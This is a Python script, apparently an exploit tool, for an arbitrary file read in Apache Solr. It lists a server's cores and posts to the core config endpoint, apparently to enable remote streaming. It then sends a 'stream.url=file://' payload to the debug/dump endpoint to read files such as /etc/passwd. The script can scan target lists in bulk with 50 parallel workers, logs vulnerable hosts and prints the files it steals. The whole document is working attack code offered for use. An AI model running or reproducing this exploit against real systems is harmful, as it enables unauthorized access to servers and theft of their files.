from concurrent.futures import ProcessPoolExecutor
import requests
import os
import optparse
import re

class Solr_readfile_exp(object):
    def __init__(self):
        self.headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
                      "Content-Type":"application/json"}
        self.timeout=5
        self.exp=["/solr/admin/cores?indexInfo=false&wt=json","/solr/{name}/config","/solr/{name}/debug/dump?param=ContentStreams"]
        self.post="stream.url=file:///etc/passwd"

    def sendpoc(self,*args):
        url,file=args[0]
        testurl=str(url).rstrip("/")+self.exp[0]
        try:
            rqt=requests.get(url=testurl,headers=self.headers,timeout=self.timeout)
            text=rqt.text
            names = re.findall('"name":".*?"', text)
            if (len(names)>0):
                name=names[0].split(":")[-1].replace('"',"")
                testurl=str(url).rstrip("/")+self.exp[1].format(name=name)
                rqt2=requests.post(url=testurl,headers=self.headers,timeout=self.timeout)
                if("This response format is experimental." in rqt2.text):
                    testurl=str(url).rstrip("/")+self.exp[2].format(name=name)
                    self.headers["Content-Type"]="application/x-www-form-urlencoded"
                    rqt2=requests.post(url=testurl,headers=self.headers,timeout=self.timeout,data='stream.url=file://{}'.format(file))
                    print("存在任意文件读取:{}".format(url))
                    print("存在任意文件读取:{}".format(url),file=open("save.txt","a",encoding="utf-8"))
                    print(rqt2.json()["streams"][0]["stream"])
                else:
                    print("[-] 不存在漏洞:{}   ".format(url))
            else:
                print("[-] 不存在漏洞:{}".format(url))
        except Exception as error:
            #print("Request URL:{} Error:{}".format(testurl,error))
            pass
if __name__ == '__main__':
    exp=Solr_readfile_exp()
    parser=optparse.OptionParser()
    parser.add_option('-u',dest='url',help="需要单独测试的url")
    parser.add_option('-f',dest='file',help="批量测试(指定目标文件)")
    parser.add_option('-r',dest='filepath',help="要读取的文件路径")
    (option,args)=parser.parse_args()
    if(option.url and option.filepath):
        exp.sendpoc((option.url,option.filepath))
    elif (option.file and option.filepath):
        if (os.path.exists(option.file)):
            print("[+] found file:{}".format(option.file))
        else:
            print("[-] file:{} not found".format(option.file))
            exit()
        tmp=[]
        for url in open(option.file,"r",encoding="utf-8").read().split("\n"):
            tmp.append((url,option.filepath))
        with ProcessPoolExecutor(max_workers=50) as execute:
            execute.map(exp.sendpoc,tmp,chunksize=1)
    else:
        parser.print_help()
